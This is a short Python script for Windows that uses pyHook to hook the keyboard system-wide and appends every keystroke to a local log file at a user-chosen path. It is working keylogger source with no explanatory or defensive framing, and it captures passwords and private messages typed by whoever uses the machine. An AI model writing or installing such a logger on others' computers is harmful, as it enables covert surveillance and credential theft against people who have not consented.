import sys
import os
import win32api
import pythoncom
import pyHook

log_file_path = input("Enter the path where you want to save the log file (e.g., C:\\Logs\\keylog.txt): ")

try:
    f = open(log_file_path, 'a')
    f.close()
except:
    f = open(log_file_path, 'w')
    f.close()

def OnKeyboardEvent(event):
    with open(log_file_path, 'a') as f:
        f.write(chr(event.Ascii))
    return True

hook = pyHook.HookManager()
hook.KeyDown = OnKeyboardEvent
hook.HookKeyboard()

pythoncom.PumpMessages()

